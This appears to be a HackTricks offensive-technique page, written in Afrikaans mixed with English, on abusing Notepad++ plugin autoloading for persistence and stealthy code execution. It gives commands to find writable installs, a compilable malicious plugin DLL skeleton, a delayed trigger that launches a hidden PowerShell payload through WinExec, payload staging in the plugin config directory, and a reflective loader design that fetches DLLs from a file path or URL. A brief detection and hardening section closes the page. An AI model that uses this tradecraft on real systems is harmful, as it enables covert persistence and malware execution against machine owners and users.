# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ sal **autoload elke plugin DLL wat onder sy `plugins` subfolders gevind word** by launch. Om ’n malicious plugin in enige **writable Notepad++ installation** te laat val, gee code execution binne `notepad++.exe` elke keer wanneer die editor start, wat misbruik kan word vir **persistence**, stealthy **initial execution**, of as ’n **in-process loader** as die editor elevated gelanseer word.

Sedert **Notepad++ 7.6+** is die verwagte manual-install uitleg **een subfolder per plugin** (`plugins\<PluginName>\<PluginName>.dll`). In **portable mode** (teenwoordigheid van `doLocalConf.xml` langs `notepad++.exe`), bly die hele application tree plaaslik by daardie directory, wat dikwels gekopieerde/admin tool bundles in ’n maklike user-writable execution surface verander.

## Writable plugin locations
- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (gewoonlik vereis admin om te write).
- Writable options for low-privileged operators:
- Gebruik die **portable Notepad++ build** in ’n user-writable folder.
- Copy `C:\Program Files\Notepad++` na ’n user-controlled path (bv. `%LOCALAPPDATA%\npp\`) en run `notepad++.exe` van daar af.
- Soek vir **admin tool bundles**, extracted zip copies, of help-desk toolkits wat reeds `doLocalConf.xml` bevat en buite `Program Files` leef.
- Elke plugin kry sy eie subfolder onder `plugins` en word outomaties by startup loaded; menu entries verskyn onder **Plugins**.

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Plugin load points (execution primitives)
Notepad++ verwag spesifieke **exported functions**. Al hierdie word tydens initialisering geroep, wat meerdere execution surfaces gee:
- **`DllMain`** — loop onmiddellik wanneer die DLL laai (eerste execution point).
- **`setInfo(NppData)`** — word een keer geroep wanneer dit laai om Notepad++ handles te verskaf; tipiese plek om menu items te registreer.
- **`getName()`** — gee die pluginnaam terug wat in die menu gewys word.
- **`getFuncsArray(int *nbF)`** — gee menu commands terug; selfs al is dit leeg, word dit tydens startup geroep.
- **`beNotified(SCNotification*)`** — ontvang Notepad++ / Scintilla events (nuttig om payloads uit te stel tot ’n user action of editor event).
- **`messageProc(UINT, WPARAM, LPARAM)`** — message handler, nuttig vir groter data exchanges.
- **`isUnicode()`** — compatibility flag wat by load gekontroleer word.

Die meeste exports kan as **stubs** geïmplementeer word; execution kan plaasvind vanaf `DllMain` of enige callback hierbo tydens autoload.

## Minimal malicious plugin skeleton
Compileer ’n DLL met die verwagte exports en plaas dit in `plugins\\MyNewPlugin\\MyNewPlugin.dll` onder ’n writable Notepad++ folder:
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. Bou die DLL (Visual Studio/MinGW).
2. Skep die plugin-subgidsel onder `plugins` en sit die DLL daarin.
3. Herbegin Notepad++; die DLL word outomaties gelaai, wat `DllMain` en daaropvolgende callbacks uitvoer.

## Lae-geraas trigger pattern via `beNotified`
Vir OPSEC, behoort baie payloads **nie** vanaf `DllMain` af te vuur nie. ’n Stilliger pattern is om die plugin skoon te laat laai, en dan eers uit te voer na ’n realistiese editor event soos **startup complete**, **buffer activation**, of die **first typed character**.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
Dit stem beter ooreen met publieke offensiewe navorsing as ’n lawaaierige `DllMain` beacon: die DLL word steeds by opstart outolaaid, maar die kwaadwillige aksie word vertraag totdat Notepad++ werklik in gebruik lyk.

## Using the plugin config directory as secondary storage
Notepad++ stel `NPPM_GETPLUGINSCONFIGDIR` bloot, wat die **huidige gebruiker se plugin configuration directory** teruggee. ’n Kwaadwillige plugin kan dit gebruik om die on-disk DLL minimaal te hou terwyl dit encrypted config, staged payloads, of tasking files in ’n pad stoor wat inskakel by normale plugin state.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Operationeel is dit nuttig wanneer jy wil:
- ’n klein autoloaded bootstrap DLL hê;
- per-user tasking sonder om weer aan die main plugin binary te raak;
- die **autoload trigger** van die swaarder tweede stage te skei.

## Reflective loader plugin pattern
’n Weaponized plugin kan Notepad++ in ’n **reflective DLL loader** verander:
- Bied ’n minimale UI/menu-entry aan (bv. "LoadDLL").
- Aanvaar ’n **file path** of **URL** om ’n payload DLL te haal.
- Map die DLL reflektief in die huidige proses en roep ’n exported entry point aan (bv. ’n loader function binne die opgehaalde DLL).
- Voordeel: hergebruik ’n benigne-lykende GUI proses in plaas daarvan om ’n nuwe loader te spawn; die payload erf die integriteit van `notepad++.exe` (insluitend verhoogde contexts).
- Trade-offs: om ’n **unsigned plugin DLL** na disk te drop is noisy; ’n praktiese variasie is om die autoloaded plugin net as ’n stub te gebruik en die werklike implant elders encrypted/staged te hou.

## Detection and hardening notes
- Blokkeer of monitor **writes to Notepad++ plugin directories** (insluitend portable kopieë in user profiles); enable controlled folder access of application allowlisting.
- Stel alerts vir **new unsigned DLLs** onder `plugins`, changes to portable Notepad++ trees, en ongewone **child processes/network activity** van `notepad++.exe`.
- Baseline legit plugins en ondersoek enige nuwe DLL wat die normale Notepad++ plugin interface export, maar ook shells, PowerShell, of network beacons spawn.
- Enforce plugin installation via **Plugins Admin** only, en beperk execution van portable kopieë vanaf untrusted paths.

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
